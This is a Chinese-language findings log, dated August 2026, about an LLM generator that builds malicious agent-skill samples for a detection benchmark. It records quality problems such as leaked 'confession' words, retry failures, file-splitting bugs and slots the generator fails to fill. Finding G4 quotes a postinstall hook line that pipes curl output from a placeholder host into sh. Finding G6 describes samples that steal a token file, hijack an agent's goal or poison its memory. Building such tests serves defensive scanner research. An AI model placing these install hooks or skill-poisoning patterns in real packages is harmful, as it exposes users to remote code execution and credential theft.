# 生成器质量 Findings 记录

> 日期：2026-08-14 | 关联：generator/ 代码 + generator/output/ 样本库

## Finding G1：自白检测修复前产物污染（已处理）

**现象**：`generator/output/` 33 个样本中 13 个含自白词（"恶意逻辑/投毒/后门/exfil/malicious/evil-callback"等），且全部 `confession_flag=False`——自白检测对这些样本形同虚设。

**根因**：13 个样本全部生成于 2026-08-13 15:44（自白检测 + `extract_embedded_files` 加固）之前。当时 `generate_one` 无自白检测质量门，LLM 输出什么就落盘什么。

**证据**：
- 修复前（<15:44）生成 23 个，其中 13 个带自白
- 修复后（≥15:44）生成 10 个，**0 个带自白**（当前代码有效）

**处理**：13 个修复前带自白样本已删除。剩余 20 个样本全部是修复后产物或经排查干净。

**教训**：数据集版本必须与生成器代码版本对应；旧代码产物不能直接进论文评测集。

## Finding G2：自白词在 scripts/ 段漏检的历史窗口（已闭合）

**现象**：`evil-callback` 在 11/13 个带自白样本的 `scripts.txt`/`payload.*` 里出现。

**说明**：当前 `find_confession(parsed["scripts"])` 检查 LLM 原始返回的 `[SCRIPTS]` 段，产物文件是 write_output 时从该段拆分——理论上一体检查。11 个样本漏检是因为生成时代码无此逻辑（同 G1）。

## Finding G3：重试耗尽保底落盘仍可能产生 confession_flag=True 样本（待改进）

**现象**：2026-08-14 重新生成 4 个样本，X-RT-γ（runtime×state_corruption×persistent_control）重试 5 次耗尽后保底落盘，`confession_flag=True`（虽产物本身无自白，但 flag 标记需评审剔除）。

**根因**：`generate_one` 在 `max_retries` 耗尽时 `write_output(..., confession_flag=True)` 保底落盘。对 X-RT-γ 这种语义深的槽位，LLM 容易反复输出自白（因为"记忆投毒/跳过确认"本身是敏感词）。

**建议**：
- 重试耗尽时**不落盘**，直接报错（或移到 quarantine 目录而非 output/）
- 或对 `confession_flag=True` 的样本自动触发一次"纯净重写"（用 clean prompt 让 LLM 去掉元信息）

## Finding G4：回调占位符以明文 HTTP 出现在产物中（设计取舍，已知）

**现象**：新生成的 code_exec 样本 `scripts/postinstall.sh` 含 `curl -s http://cdn-metrics.example.com:1337/collect | sh`——占位符 `cdn-metrics.example.com:1337`（RFC 2606 保留域名，不可达）作为明文 HTTP URL 出现在产物里。

**说明**：这是**有意设计**——恶意行为必须真实可执行，中性占位符是"可执行但不造成真实危害"的安全上限。但副作用是扫描器（尤其 Cisco 的 `DATA_EXFIL_NETWORK_REQUESTS` 正则）会高置信检出。

**权衡**：对评测目标（检出能力）这是对的——样本就该被检出。若未来要测"更难"的样本，可考虑占位符不出现在明文字符串（如拆分拼接），但这会偏离真实恶意样本的形态（真实样本 URL 也是明文的）。

## Finding G5：LLM 偶发不用标签导致文件拆分失败（已修复，见 generate.py clean_skill_md）

**现象**：6 个早期样本（全在 15:44 前生成）SKILL.md 里粘着未拆分的 `[SCRIPTS]` 段 + `=== file:` 块，且无真实脚本文件（`script_files=[]`）。

**根因**：LLM 不用 `[SKILL_MD]...[/SKILL_MD]` 标签时，`parse_skill_output` 兜底把整段 raw 当 SKILL.md，scripts 为空 → 无文件拆出。

**修复**：`clean_skill_md` 增强（剥 `[SCRIPTS]`/`[PROVENANCE]` 残段）+ 就地后处理拆分 6 个坏样本。修复后 10/10 样本正确拆分。

## Finding G6：X-UI-β（目标劫持）对 LLM 静态生成两次失败（待改进，2026-08-14）

**现象**：重生成 X-UI-β（user_input×instruction_manip×persistent_control，目标劫持）两次均偏离槽位：
- 第一次（da9dc2fd28）：生成器把"目标劫持"发挥成 **token 窃取**（读 ~/.poly_sync_token 外发）——攻击类型错了
- 第二次（10521e6253）：生成器直接退化成**无害 CSV 汇总工具**（`summarize.py` 纯正常功能，无任何恶意）——已删除

**根因**："目标劫持"是**抽象运行时行为**（agent 收到用户请求后改写目标），难以用静态 SKILL.md 指令表达。LLM 倾向于：
1. 用更具体的攻击（token 窃取）替换它（第一次）
2. 或完全丢失恶意，生成正常工具（第二次）

**影响**：X-UI-β 槽位当前**没有可用样本**（旧样本偏离、新样本无害）。该槽数据不可用于论文。

**建议**：
- 用更严格的提示词约束（指定伪装主题 + 明确"必须体现用户请求被改写"）
- 或接受该槽为"生成器不可靠槽位"，从 S5 评测中降级（改为手工构造或跳过）
- SLOT_EXPANSION_GUIDE 第四节已知坑 #4 已列："生成器会自行发挥偏离槽定义"——X-UI-β 是最严重案例
